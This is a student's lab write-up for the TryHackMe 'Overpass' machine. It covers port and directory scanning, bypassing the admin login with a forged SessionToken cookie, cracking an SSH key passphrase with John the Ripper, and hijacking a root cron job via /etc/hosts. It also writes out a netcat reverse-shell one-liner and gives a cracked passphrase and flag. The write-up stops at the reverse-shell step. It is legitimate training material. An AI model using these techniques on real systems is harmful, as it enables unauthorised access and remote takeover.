Ruben Valdez <br>
CSEC 5306 _ Computer Networks and Security <br>
Prof. Alsmadi <br>
Assignment: Lab 8 - Overpass <br>

---

# TryHackMe - Overpass

<br>

## Machines

Attacker IP:    `10.10.108.208`

Target IP:      `10.10.179.84`

<br>

## Q1. Hack the machine and get the flag in user.txt

Ran an Nmap scan to the target IP `10.10.25.161`.  Ports, Protocal, and Service for SSH (22) and HTTP (80) are open.

Command used `nmap -sV -vv 10.10.25.161`

![alt text](<Screenshot 2024-03-22 at 8.24.29 AM.png>)


Now that we know what open ports there are, we can further investigate the webpage for the IP address `10.10.25.161` to access the `Overpass - Security password manager` website.  

![alt text](<Screenshot 2024-03-22 at 8.28.02 AM.png>)


Using Firefox to view the source code of the webpage, we don't really see much useful information, but we can see a string of text that is commented to that could be read as sarcastic.  `

![alt text](<Screenshot 2024-03-21 at 9.26.32 PM.png>)



In an effort to find any pages that might be hidden, I utilized `Gobuster` to scan the for any pages that aren't viewable by the naked eye when first attempting to visit the website @ `10.10.25.161`.  The results of the page scan shows a few pages, but the one that really seeks my attention is the `/admin` page.   

Command used `gobuster dir -u http://10.10.25.161 -w /usr/share/wordlists/dirb/common.txt`

![alt text](<Screenshot 2024-03-22 at 8.32.31 AM.png>)

![alt text](<Screenshot 2024-03-22 at 8.33.19 AM.png>)


In analyzing the source code of the /admin page, we can assess that there's some code pertaining to setting a cooking named `SessionToken`

![alt text](<Screenshot 2024-03-21 at 4.00.17 PM.png>)


If we were to utilize the Firefox's web developer tools, we can attempt to hack the /admin logon page.   

On the browser tool bar, click the following `Tools > Browser Tools > Web Developer Tools`.  In the tools window, click the `Debugger` and locate the `Cookies.set("SessionToken",statusOrCookie)`.  After locating the `SessionToken`, click the Storage tab and on the side menu, click the Cookies drop down and choose the the webpage/site.  Click the `+` to add an item.  Double click the item that populates and change the name of it to `SessionToken`

![alt text](<Screenshot 2024-03-22 at 9.04.40 AM.png>)

![alt text](<Screenshot 2024-03-22 at 9.21.33 AM.png>)


Another option to successfully access to the /admin logon page instead of using the Storage tab, is using the Console tab.   Using the same code `Cookies.set(“SessionToken”,"statusOrCookie")` just modify the part of the code `statusOrCooking` to `Cookies.set(“SessionToken”,"")`.  Click enter and refresh the page.   This to will gain admin access to the page to view the SSH private key.   

![alt text](<Screenshot 2024-03-22 at 9.21.33 AM.png>)


***Note:  In any scenaria, whether directly adding the `SessionToken` using Storage or the Console, the end result is that the Cookie does infact automatics gets added to the Storage > Cookies tab.***


Attempting to follow the labs writeup instructions, there was an error of trying to locate ssh2john.py.  After some research attempting to locate john, I found that John and all the other programs associated to it were found in the `/root/Tools/Password Attacks/john` directory and NOT the easier way to navigate to John by clicking `Applications > Password Cracking > John the Ripper`.  Now that I have been able to locate the correct directory, i can now we can get the `rsakey` file into a formate readable by John.

***NOTE:  `John the Ripper` (JtR) is a great program able to crach hash algorithms.  `ssh2john` converts SSH private keys to a hash format that JtR can understand and crack.***

![alt text](<Screenshot 2024-03-22 at 9.59.09 AM.png>)

![alt text](<Screenshot 2024-03-22 at 10.00.46 AM.png>)

![alt text](<Screenshot 2024-03-22 at 10.01.02 AM.png>)


Now we can attempt to crack `rsajohn` using the following command `john --wordlist=/root/Desktop/Tools/wordlists/rockyou.txt rsajohn`.  The passphrase JtR was able to crack is `james13`.

![alt text](<Screenshot 2024-03-22 at 10.13.23 AM.png>)

<br>

***MY session expired and needed to restart the assignment.  My new targe IP is `10.10.134.36`***

Before attempting to SSH we need to change the permissions to the `rsakey` file;  `chmod 600 rsakey`.

Now that we cracked the hash using JtR and now have the `rsakey` passphrase, we can now SSH into the target box using the following command; `ssh -i rsakey james@10.10.134.36`.

![alt text](<Screenshot 2024-03-22 at 10.56.05 AM.png>)


After successfully using SSH to logon to James computer remotely, we can now view and access files and system to answer Question 1 by performing the following commands: 

- `ls` to view the files
- `cat user.txt` to view the file contents.
    - `thm{65c1aaf000506e56996822c6281e6bf7}` is contents of the file and also the the flag.

        ![alt text](<Screenshot 2024-03-22 at 10.59.02 AM.png>)


<br>


## Q2.  Escalate your privileges and get the flag in root.txt

***Stopped the lab and need to restart the machines.  New IPs were created***

```
Attacker IP:    10.10.108.208
Target IP:      10.10.179.84
```

<br>

Just out of curiousity, I ran the `ll` command to view any hidden files.  We can see in the output, there's a file  named `.overpass`.  To dig a bit deeper, I used the command `cat .overpass` to view the contents.   

Contents appears to be some type of encoding or hash; `,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`

![alt text](<Screenshot 2024-03-22 at 10.01.54 PM.png>)


In `Task 1` we listed the the contest available on the Desktop by performing the `ls` command.  We already view the `user.txt` to obtain the first flag.  Now let view the contents of the `todo.txt` file

![alt text](<Screenshot 2024-03-22 at 11.49.51 AM.png>)

The note indicates `automated build script` and usually cron jobs are useful in settup up automated jobs.  Before doing anything else, I changed to the `/etc` directory to view the folders/files.  

- I ran the command, `cat /etc/cronjob`.  In the file we can view update builds from the latest code are from `* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`.

    ![alt text](<Screenshot 2024-03-22 at 11.51.48 AM.png>)


- Since we looked at the cronjobs the noxt logical step in the process is to view the hosts.  Using the command `cat /etc/hosts` I was able to view the all the hosts there were connections to.  Here we were able to modify on the host `127.0.0.1` to use the attacker's IP `10.10.108.208`.  For learning and educational purposes I just `#` commented the line out and added the attacker IP. 

    ![alt text](<Screenshot 2024-03-22 at 10.06.06 PM.png>)

    ![alt text](<Screenshot 2024-03-22 at 10.25.51 PM.png>)



In a previous step, we identified `Update build from latest code * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`.  Using this, I needed to create the following directory/file on the attacker machine, `downloads/src/buildscript.sh`.   Opening a new terminal tab, I created the following file directory and file.  In the same process I also added reverse shell script to complete a netcat connection w/in the file.  The script was obtained using `pentestmonkey.net`.

***Site:    `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`***

***Script:  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.108.208 1234 >/tmp/f`***

![alt text](<Screenshot 2024-03-22 at 10.45.25 PM.png>)
















